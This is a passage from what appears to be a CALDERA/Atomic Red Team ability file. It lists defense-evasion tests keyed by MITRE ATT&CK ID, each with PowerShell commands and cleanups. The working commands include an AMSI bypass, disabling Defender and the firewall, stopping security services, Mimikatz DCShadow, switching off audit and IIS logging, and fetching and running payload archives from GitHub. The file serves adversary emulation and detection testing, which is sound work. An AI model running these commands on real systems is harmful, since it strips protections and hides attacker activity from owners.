                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName foo -ModulePath $PWD",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "085858a8aa5ea8e6a810e59c75ea7f6a",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "085858a8aa5ea8e6a810e59c75ea7f6a"
    },
    "T1036__defense-evasion__Masquerading__7575d3d5ae97ee568d49afbd0f878fe2": {
        "description": "When the file is unzipped and the README.cmd file opened, it executes and changes the .pdf to .dll and executes the dll. This is a BazaLoader technique [as reported here](https://twitter.com/ffforward/status/1481672378639912960)",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1036",
            "name": "Masquerading"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "taskkill /IM Calculator.exe /f >$null 2>$null; Remove-Item \"$env:userprofile\\Downloads\\T1036\" -recurse -ErrorAction Ignore",
                    "command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip\") { ; } else {New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null; Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036/bin/T1036.zip -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip\"};  ;  Expand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip\" -DestinationPath \"$env:userprofile\\Downloads\\T1036\" -Force; cd \"$env:userprofile\\Downloads\\T1036\"; cmd /c \"$env:userprofile\\Downloads\\T1036\\README.cmd\" >$null 2>$null",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7575d3d5ae97ee568d49afbd0f878fe2",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "7575d3d5ae97ee568d49afbd0f878fe2"
    },
    "T1218__defense-evasion__Signed Binary Proxy Execution__e6190b6456bdab5e159fabbfe1fcf251": {
        "description": "Emulates attack with a renamed Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218",
            "name": "Signed Binary Proxy Execution"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "&\"#{renamed_binary}\" \"#{xml_payload}\" output.txt",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e6190b6456bdab5e159fabbfe1fcf251",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "e6190b6456bdab5e159fabbfe1fcf251"
    },
    "T1218.005__defense-evasion__Signed Binary Proxy Execution: Mshta__d143172642328567d9d0951cb116e3a2": {
        "description": "Executes an HTA Application using JScript script engine simulating double click.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.005",
            "name": "Signed Binary Proxy Execution: Mshta"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -SimulateUserDoubleClick",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d143172642328567d9d0951cb116e3a2",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "d143172642328567d9d0951cb116e3a2"
    },
    "T1112__defense-evasion__Modify Registry__f4d3c5648b8d2fab9b061016eb91f478": {
        "description": "The following Atomic Test creates a registry blob in HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds, which is related to Snake Malware. Per the report, upon execution, Snake's WerFault.exe will attempt to decrypt an encrypted blob within the Windows\nregistry that is typically found at HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds. The encrypted data includes the AES key, IV, and path that is used to find and decrypt the file containing Snake's kernel driver and kernel driver loader.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1112",
            "name": "Modify Registry"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$typicalPath = \"HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds\"; Remove-ItemProperty -Path $typicalPath -Name \"AtomicSnake\" -ErrorAction SilentlyContinue | Out-Null",
                    "command": "$typicalPath = \"HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds\"; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); New-ItemProperty -Path $typicalPath -Name \"AtomicSnake\" -Value $randomBytes -PropertyType Binary -Force | Out-Null",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f4d3c5648b8d2fab9b061016eb91f478",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f4d3c5648b8d2fab9b061016eb91f478"
    },
    "T1562.001__defense-evasion__Impair Defenses: Disable or Modify Tools__f5b48f9f8e01db3edd487c05580a0e90": {
        "description": "Beginning with Powershell 6.0, the Stop-Service cmdlet sends a stop message to the Windows Service Controller for each of the specified services. The Remove-Service cmdlet removes a Windows service in the registry and in the service database.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Stop-Service -Name McAfeeDLPAgentService; Remove-Service -Name McAfeeDLPAgentService",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f5b48f9f8e01db3edd487c05580a0e90",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f5b48f9f8e01db3edd487c05580a0e90"
    },
    "T1070.003__defense-evasion__Indicator Removal on Host: Clear Command History__18d69a8fd988d6b63f5307ce857723c9": {
        "description": "The \"AddToHistoryHandler\" receives the current command as the $line variable and then returns $true if \nthe line should be written to the history file. Here we simply return $false so nothing gets added to \nthe history file for the current session. \n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.003",
            "name": "Indicator Removal on Host: Clear Command History"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Set-PSReadLineOption -AddToHistoryHandler $null",
                    "command": "Set-PSReadLineOption -AddToHistoryHandler { return $false }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "18d69a8fd988d6b63f5307ce857723c9",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "18d69a8fd988d6b63f5307ce857723c9"
    },
    "T1553.005__defense-evasion__Subvert Trust Controls: Mark-of-the-Web Bypass__9b3194cc656092b09f4d79ba3d3a3277": {
        "description": "Mounts an ISO image downloaded from internet to evade Mark-of-the-Web and run hello.exe executable from the ISO. \nUpon successful execution, powershell will download the .iso from the Atomic Red Team repo, mount the image, and run the executable from the ISO image that will open command prompt echoing \"Hello, World!\". \nISO provided by:https://twitter.com/mattifestation/status/1398323532988399620 Reference:https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/,  ",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1553.005",
            "name": "Subvert Trust Controls: Mark-of-the-Web Bypass"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Dismount-DiskImage -ImagePath \"0f959a_FeelTheBurn.iso\" | Out-Null; Stop-process -name \"hello\" -Force -ErrorAction ignore",
                    "command": "Mount-DiskImage -ImagePath \"0f959a_FeelTheBurn.iso\" -StorageType ISO -Access ReadOnly; $keep = Get-Volume -FileSystemLabel \"TestIso\"; $driveLetter = ($keep | Get-Volume).DriveLetter; invoke-item \"$($driveLetter):\\hello.exe\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "0f959a_FeelTheBurn.iso",
                        "0f959a_FeelTheBurn.iso"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "9b3194cc656092b09f4d79ba3d3a3277",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "9b3194cc656092b09f4d79ba3d3a3277"
    },
    "T1562.004__defense-evasion__Impair Defenses: Disable or Modify System Firewall__34f398de2b04b96158b3bd25abaea5a7": {
        "description": "This test will attempt to allow an executable through the system firewall located in the Users directory",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.004",
            "name": "Impair Defenses: Disable or Modify System Firewall"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "netsh advfirewall firewall delete rule name=\"Atomic Test\" | Out-Null; Remove-Item C:\\Users\\$env:UserName\\AtomicTest.exe -ErrorAction Ignore",
                    "command": "Copy-Item \"f7ce09_AtomicTest.exe\" -Destination \"C:\\Users\\$env:UserName\" -Force; netsh advfirewall firewall add rule name=\"Atomic Test\" dir=in action=allow program=\"C:\\Users\\$env:UserName\\AtomicTest.exe\" enable=yes",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "f7ce09_AtomicTest.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "34f398de2b04b96158b3bd25abaea5a7",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "34f398de2b04b96158b3bd25abaea5a7"
    },
    "T1207__defense-evasion__Rogue Domain Controller__acd37a62e589a7190c35101583939337": {
        "description": "Use Mimikatz DCShadow method to simulate behavior of an Active Directory Domain Controller and edit protected attribute.\n\n[DCShadow](https://www.dcshadow.com/)\n[Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)\n\nIt will set the badPwdCount attribute of the target user (user/machine account) to 9999. You can check after with:\nGet-ADObject -LDAPFilter '(samaccountname=<user>)' -Properties badpwdcount | select-object -ExpandProperty badpwdcount\n\nNeed SYSTEM privileges locally (automatically obtained via PsExec, so running as admin is sufficient), and Domain Admin remotely.\nThe easiest is to run elevated and as a Domain Admin user.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1207",
            "name": "Rogue Domain Controller"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Stop-Process -Name \"mimikatz\" -Force -ErrorAction Ignore",
                    "command": "$dc_output_file = \"PathToAtomicsFolder\\..\\ExternalPayloads\\art-T1207-mimikatz-DC.log\"; Remove-Item $dc_output_file -ErrorAction Ignore; $mimikatzParam =\"`\"log $dc_output_file`\" `\"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`\" `\"exit`\"\"; $dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \"/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzParam\"; Start-Sleep -Seconds 5; & \"#{mimikatz_path}\" \"lsadump::dcshadow /push\" \"exit\"; Write-Host \"`nWaiting for fake DC server to return\"; Wait-Process $dc; Write-Host \"`nOutput from fake DC server:\"; Get-Content $dc_output_file; Start-Sleep 1; Remove-Item $dc_output_file -ErrorAction Ignore; Write-Host \"End of DCShadow\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "acd37a62e589a7190c35101583939337",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "acd37a62e589a7190c35101583939337"
    },
    "T1562.002__defense-evasion__Impair Defenses: Disable Windows Event Logging__bc5d26cf7201f1504b495ca2c1758ebf": {
        "description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).\nThis action requires HTTP logging configurations in IIS to be unlocked.\n\nUse the cleanup commands to restore some default auditpol settings (your original settings will be lost)\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.002",
            "name": "Impair Defenses: Disable Windows Event Logging"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "if(Test-Path \"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"){;   C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"Default Web Site\" /section:httplogging /dontLog:false *>$null; }",
                    "command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"Default Web Site\" /section:httplogging /dontLog:true",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "bc5d26cf7201f1504b495ca2c1758ebf",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "bc5d26cf7201f1504b495ca2c1758ebf"
    },
    "T1562.001__defense-evasion__Impair Defenses: Disable or Modify Tools__34952e2eefd3066c5f574744e1734ca6": {
        "description": "Any easy way to bypass AMSI inspection is it patch the dll in memory setting the \"amsiInitFailed\" function to true.\nUpon execution, no output is displayed.\n\nhttps://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)",
                    "command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "34952e2eefd3066c5f574744e1734ca6",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "34952e2eefd3066c5f574744e1734ca6"
    },
    "T1112__defense-evasion__Modify Registry__1296157a99b29c9a81fb1ce4eaf24cbd": {
        "description": "This test simulates an adversary modifying the Internet Zone Protocol Defaults in the registry of the currently logged-in user using PowerShell. Such modifications can be indicative of an adversary attempting to weaken browser security settings. \nTo verify the effects of the test:\n1. Open the Registry Editor (regedit.exe).\n2. Navigate to \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\".\n3. Check for the presence of the \"http\" and \"https\" DWORD values set to `0`.\nOr run:\n```powershell\nGet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' | Select-Object http,https\n```\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1112",
            "name": "Modify Registry"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Set-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'http' -Value 3; Set-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'https' -Value 3",
                    "command": "Set-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'http' -Value 0; Set-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'https' -Value 0",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1296157a99b29c9a81fb1ce4eaf24cbd",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "1296157a99b29c9a81fb1ce4eaf24cbd"
    },
    "T1562.004__defense-evasion__Impair Defenses: Disable or Modify System Firewall__986876c6024765475043100f9e080fc8": {
        "description": "An adversary tries to modify the windows firewall registry.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.004",
            "name": "Impair Defenses: Disable or Modify System Firewall"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\"  -Name EnableFirewall -Force -ErrorAction Ignore; Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" -Name EnableFirewall -Force -ErrorAction Ignore",
                    "command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "986876c6024765475043100f9e080fc8",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "986876c6024765475043100f9e080fc8"
    },
    "T1218.007__defense-evasion__Signed Binary Proxy Execution: Msiexec__c905c33c06f38484cab101ae93a93a9a": {
        "description": "Executes an MSI containing an embedded EXE using the WMI Win32_Product class\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.007",
            "name": "Signed Binary Proxy Execution: Msiexec"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c905c33c06f38484cab101ae93a93a9a",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "c905c33c06f38484cab101ae93a93a9a"
    },
    "T1070__defense-evasion__Indicator Removal on Host__cea891e7c3c3efe3723eca495d261472": {
        "description": "Finds a file by user name (if Disk Quotas are enabled), queries allocated ranges for a file, sets a file's short name, sets a file's valid data length, sets zero data for a file, or creates a new file. Upon execution, no output\nwill be displayed. More information about fsutil can be found at https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-file\n- https://tria.ge/230601-x8x6bsgb24/behavioral2\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070",
            "name": "Indicator Removal on Host"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "rm \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt\"",
                    "command": "if (-not (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt\")) { New-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt\" -Force } ; echo \"1234567890\" > \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt\"; fsutil  file setZeroData offset=0 length=10 \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "cea891e7c3c3efe3723eca495d261472",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "cea891e7c3c3efe3723eca495d261472"
    },
    "T1070.004__defense-evasion__Indicator Removal on Host: File Deletion__b0026f9a57639c049490a43d623d7695": {
        "description": "Adversaries may delete TeamViewer log files to hide activity. This should provide a high true-positive alert ration.\nThis test just places the files in a non-TeamViewer folder, a detection would just check for a deletion event matching the TeamViewer\nlog file format of TeamViewer_##.log. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n\nhttps://twitter.com/SBousseaden/status/1197524463304290305?s=20\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.004",
            "name": "Indicator Removal on Host: File Deletion"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "New-Item -Path $env:TEMP\\TeamViewer_54.log -Force | Out-Null; Remove-Item $env:TEMP\\TeamViewer_54.log -Force -ErrorAction Ignore",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b0026f9a57639c049490a43d623d7695",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "b0026f9a57639c049490a43d623d7695"
    },
    "T1562.001__defense-evasion__Impair Defenses: Disable or Modify Tools__32047c4f30d4e65ebc9b22b9b8368bca": {
        "description": "Attempting to disable scheduled scanning and other parts of Windows Defender ATP using set-MpPreference aliases. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Set-MpPreference -drtm 0; Set-MpPreference -dbm 0; Set-MpPreference -dscrptsc 0; Set-MpPreference -dbaf 0",
                    "command": "Set-MpPreference -drtm $True; Set-MpPreference -dbm $True; Set-MpPreference -dscrptsc $True; Set-MpPreference -dbaf $True",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "32047c4f30d4e65ebc9b22b9b8368bca",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "32047c4f30d4e65ebc9b22b9b8368bca"
    },
    "T1553.005__defense-evasion__Subvert Trust Controls: Mark-of-the-Web Bypass__3c9dee6c65974cc3b4f34d0a5d1b6992": {
        "description": "Mounts ISO image downloaded from internet to evade Mark-of-the-Web. Upon successful execution, powershell will download the .iso from the Atomic Red Team repo, and mount the image. The provided sample ISO simply has a Reports shortcut file in it. Reference: https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1553.005",
            "name": "Subvert Trust Controls: Mark-of-the-Web Bypass"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Dismount-DiskImage -ImagePath \"5fad3e_T1553.005.iso\" | Out-Null",
                    "command": "Mount-DiskImage -ImagePath \"5fad3e_T1553.005.iso\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "5fad3e_T1553.005.iso",
                        "5fad3e_T1553.005.iso"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "3c9dee6c65974cc3b4f34d0a5d1b6992",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "3c9dee6c65974cc3b4f34d0a5d1b6992"
    },
    "T1562.008__defense-evasion__Impair Defenses: Disable Cloud Logs__eb9de85953f93fc247c48f1b236839fc": {
        "description": "You can use the Exchange Management Shell to enable or disable mailbox audit logging for a mailbox.\nUnified or Admin Audit logs are disabled via the Exchange Powershell cmdline.\nhttps://github.com/Azure/Azure-Sentinel/blob/master/Detections/OfficeActivity/exchange_auditlogdisabled.yaml\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.008",
            "name": "Impair Defenses: Disable Cloud Logs"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "$secure_pwd = \"None\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"None\", $secure_pwd; Connect-ExchangeOnline -Credential $creds; Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $True",
                    "command": "$secure_pwd = \"None\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"None\", $secure_pwd; Connect-ExchangeOnline -Credential $creds; Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $False",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "eb9de85953f93fc247c48f1b236839fc",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "eb9de85953f93fc247c48f1b236839fc"
    },
    "T1562.001__defense-evasion__Impair Defenses: Disable or Modify Tools__f0fde90a3d59061b226197974e7dcbaa": {
        "description": "Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Set-MpPreference -DisableRealtimeMonitoring 0; Set-MpPreference -DisableBehaviorMonitoring 0; Set-MpPreference -DisableScriptScanning 0; Set-MpPreference -DisableBlockAtFirstSeen 0",
                    "command": "Set-MpPreference -DisableRealtimeMonitoring 1; Set-MpPreference -DisableBehaviorMonitoring 1; Set-MpPreference -DisableScriptScanning 1; Set-MpPreference -DisableBlockAtFirstSeen 1",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f0fde90a3d59061b226197974e7dcbaa",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f0fde90a3d59061b226197974e7dcbaa"
    },
    "T1112__defense-evasion__Modify Registry__86993ae14d75a6da421c0d98c3facd61": {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows CMD application.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1112",
            "name": "Modify Registry"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty -Path \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\System\" -Name DisableCMD -ErrorAction Ignore",
                    "command": "New-ItemProperty -Path \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\System\" -Name DisableCMD -Value 1",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "86993ae14d75a6da421c0d98c3facd61",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "86993ae14d75a6da421c0d98c3facd61"
    },
    "T1027.006__defense-evasion__HTML Smuggling__a96a64caf38bca14cef902e999bb6b98": {
        "description": "The HTML file will download an ISO file from [T1553.005](https://github.com/redcanaryco/atomic-red-team/blob/d0dad62dbcae9c60c519368e82c196a3db577055/atomics/T1553.005/bin/FeelTheBurn.iso) without user interaction. \nThe HTML file is based off of the work from [Stan Hegt](https://outflank.nl/blog/2018/08/14/html-smuggling-explained/)\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1027.006",
            "name": "HTML Smuggling"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$user = [System.Environment]::UserName; Remove-Item -Path C:\\Users\\$user\\Downloads\\FeelTheBurn.iso -ErrorAction Ignore",
                    "command": "if (Test-Path \"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html\") { ; } else {New-Item -Type Directory \"PathToAtomicsFolder\\T1027.006\\bin\\\" -ErrorAction ignore | Out-Null; Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.006/bin/T1027_006_Remote.html\" -OutFile \"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html\"};  ;  & \"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_remote.html\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
